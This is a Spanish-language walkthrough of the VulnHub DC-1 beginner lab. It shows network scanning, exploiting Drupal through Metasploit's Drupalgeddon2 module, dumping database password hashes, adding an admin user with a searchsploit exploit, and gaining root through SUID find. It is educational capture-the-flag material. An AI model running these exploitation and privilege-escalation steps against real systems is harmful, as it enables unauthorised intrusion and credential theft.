# DC-1 VulHub | Walkthrough

## Enlace al Desafío en Vulnhub
[https://www.vulnhub.com/entry/dc-1,292/](https://www.vulnhub.com/entry/dc-1,292/)


## Descripción
DC-1 es un laboratorio vulnerable diseñado específicamente para que principiantes adquieran experiencia en pruebas de penetración. La dificultad dependerá de las habilidades, conocimientos y capacidad de aprendizaje del usuario.

### Requisitos
- Conocimientos básicos de Linux.
- Familiaridad con la línea de comandos de Linux.
- Experiencia con herramientas básicas de pruebas de penetración, como las disponibles en Kali Linux o Parrot Security OS.

### Objetivo
El objetivo es encontrar y leer la bandera ubicada en el directorio `root`. Aunque no es necesario ser `root` para acceder a la bandera, sí se requieren privilegios elevados.

### Detalles adicionales
- **Número de banderas:** 5
- Estas banderas contienen pistas útiles para principiantes.
- Opcional: los usuarios avanzados pueden omitir las banderas intermedias e ir directamente por `root`.

## Configuración del Entorno
Descargaremos la máquina y la importaremos en VirtualBox. Utilizaremos una máquina Kali Linux para interactuar con el laboratorio. En VirtualBox, debemos crear previamente una red NAT: 

1. Ir a **Archivo → Herramientas → Administrador de red → Redes NAT** y crear una nueva red.
2. Asignar ambas máquinas (DC-1 y Kali Linux) a la red NAT creada.

![imagen](https://github.com/user-attachments/assets/a4ed4b73-b0f4-44a6-a43f-198c25e2085d)
![d5860fdf-d4e6-410e-bdb0-3e733b9f506b](https://github.com/user-attachments/assets/275fc2b6-b7f0-4e81-b9e5-cbffc085de6c)
![imagen 1](https://github.com/user-attachments/assets/3bd9d42a-afad-4f6e-a21d-51382075e439)

---


## Descubrimiento de IP

Para descubrir la dirección IP de la máquina del laboratorio, utilizaremos `netdiscover`.

1. Iniciar ambas máquinas.
2. Desde Kali Linux, ejecutar:
   ```
   ifconfig
   ```
   - Identificar la interfaz de red conectada a la red NAT (`eth0`).
![imagen 2](https://github.com/user-attachments/assets/6795f97f-dd1b-401e-8804-1af490084cdc)

3. Escanear la red para detectar la IP de DC-1:
   ```
   netdiscover -r 192.168.56.0/24
   ```
   ![imagen 3](https://github.com/user-attachments/assets/277793a5-f4f3-4c75-8ebf-cabad90a7552)
   ![imagen 4](https://github.com/user-attachments/assets/0aca0772-6c4f-47ca-9788-d970e2cf5e96)


Comprobamos que la máquina es accesible con `ping`:
```
ping <IP_DC-1>
```
![imagen 5](https://github.com/user-attachments/assets/ccb60033-431d-4424-94e2-6d428ec5316b)

---


## Escaneo de Red y Enumeración
Ejecutaremos `nmap` para escanear puertos abiertos y detectar los servicios en ejecución:
```
nmap -sC -sV -A <IP_DC-1>
```
![imagen 6](https://github.com/user-attachments/assets/56d94af6-5e79-454a-a96f-d4cdc2e82c4c)


Identificamos que en el puerto **80** está corriendo **Drupal**. Para confirmar la versión, usamos `whatweb`:
```
whatweb <IP_DC-1>
```
![imagen 7](https://github.com/user-attachments/assets/71b0a25e-3201-4019-a0ec-4e4f7bfbfb6d)
![imagen 8](https://github.com/user-attachments/assets/35b5771e-a500-442e-b843-b507d7bdfe61)


Al buscar vulnerabilidades en Google o usar `searchsploit`, encontramos **Drupalgeddon2 (CVE-2018-7600)** como una vulnerabilidad crítica.

---


## Explotación con Metasploit
Usaremos `metasploit` para explotar la vulnerabilidad de Drupal.
```
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set rhost <IP_DC-1>
exploit
```
![imagen 9](https://github.com/user-attachments/assets/26c75737-0dd2-4389-a870-9b180b9a51b9)
![imagen 10](https://github.com/user-attachments/assets/6dc1451e-e88e-4f90-a315-524b44a4f4a8)


Lanzamos un `ls` desde meterpreter y encontramos la primera bandera `flag1.txt`.
```
ls
```

![imagen 11](https://github.com/user-attachments/assets/42c53f5e-a405-438e-94ed-c332f341bea1)
![imagen 12](https://github.com/user-attachments/assets/a8a10815-2a2c-4e22-9db7-6b6afef2f1cb)

## Flag 1
**"Todo buen CMS necesita un archivo de configuración, lo mismo que tú."**

Buscamos el archivo de configuración de Drupal:
```
cat /var/www/html/sites/default/settings.php
```
![imagen 13](https://github.com/user-attachments/assets/a2b82429-f3df-4f97-8592-071ab499c959)
![imagen 14](https://github.com/user-attachments/assets/02859513-3847-4f77-9c6f-89e07a81b05b)

Encontramos la segunda bandera `flag2.txt` junto con credenciales de acceso a la base de datos.

## Flag 2
**"Los ataques de fuerza bruta y de diccionario no son las únicas formas de obtener acceso (y lo necesitarás). Qué puedes hacer con estas credenciales?"**


Para obtener un bash del sistema, usamos el comando `shell` de `meterpreter` y, tras abrir un canal, ejecutamos:
```
python -c "import pty; pty.spawn('/bin/bash')"
```
![imagen 15](https://github.com/user-attachments/assets/7b9ae97e-69c2-4401-aa4a-f4b8cc38c29d)


Utilizamos las credenciales de la base de datos para acceder a `mysql`:
```
mysql -u root -p
show databases;
use drupaldb;
show tables;
select name, pass from users;
```
![imagen 16](https://github.com/user-attachments/assets/c8d8e8a6-64e1-4e74-b0bb-b84188d71bce)
![imagen 17](https://github.com/user-attachments/assets/f6b5f408-f74c-472a-89d8-ae73828a361a)

Podemos crackear el hash con `hashcat` o `john the ripper`, pero encontramos un exploit en `searchsploit` para crear un usuario administrador.
Para obtener la contraseña del usuario admin podemos usar `hashcat` o `john the ripper`. Sin embargo, con searchsploit descubrimos un exploit que nos permite crear un usuario administrador, el cual utilizaremos para acceder al CMS: 
![imagen 18](https://github.com/user-attachments/assets/1ab9d5ba-9577-4a08-a0fb-a108e2f2f014)

![imagen 19](https://github.com/user-attachments/assets/33e29ef2-7dac-4322-a6dd-38dadfa05c49)

![imagen 20](https://github.com/user-attachments/assets/4a346129-6b82-44a8-9365-5ed0626aa8fc)


![imagen 21](https://github.com/user-attachments/assets/b6db0190-bb5e-40ff-90c6-7006bd3ac56d)

![imagen 22](https://github.com/user-attachments/assets/2a209a97-be92-4d1a-995d-ccad0d89eb33)


![imagen 23](https://github.com/user-attachments/assets/b4a43a90-061d-42ed-88b8-1e9e062d20aa)

## Flag 3
**"Permisos especiales ayudarán a encontrar la passwd, pero necesitarás usar -exec para averiguar cómo obtener lo que está en la sombra."**

Listamos los usuarios:
```
cat /etc/passwd
```
Identificamos un usuario `flag4` en `/home/flag4`, donde encontramos `flag4.txt`.

![imagen 24](https://github.com/user-attachments/assets/e38d7ecc-1634-413b-83b3-7f16137e6d3f)


## Flag 4
**"Puedes usar este mismo método para encontrar o acceder a la bandera en root? Probablemente. Pero tal vez no sea tan fácil. ¡O quizás sí lo sea!"**

---

## Escalada de Privilegios
Buscamos binarios con permisos `SUID`:
```
find / -perm -u=s 2>/dev/null
```

![imagen 25](https://github.com/user-attachments/assets/d01fb148-c3ab-4fea-b476-d919d85bd297)

Identificamos `find` como vulnerable. Consultamos GTFOBins y explotamos `find` para obtener una shell como `root`:
```
find . -exec /bin/sh \; -quit
```
![imagen 26](https://github.com/user-attachments/assets/68c70f0e-0dab-4dae-9aa9-9409d6cab305)


Obtenemos la bandera final en `/root/flag.txt`.

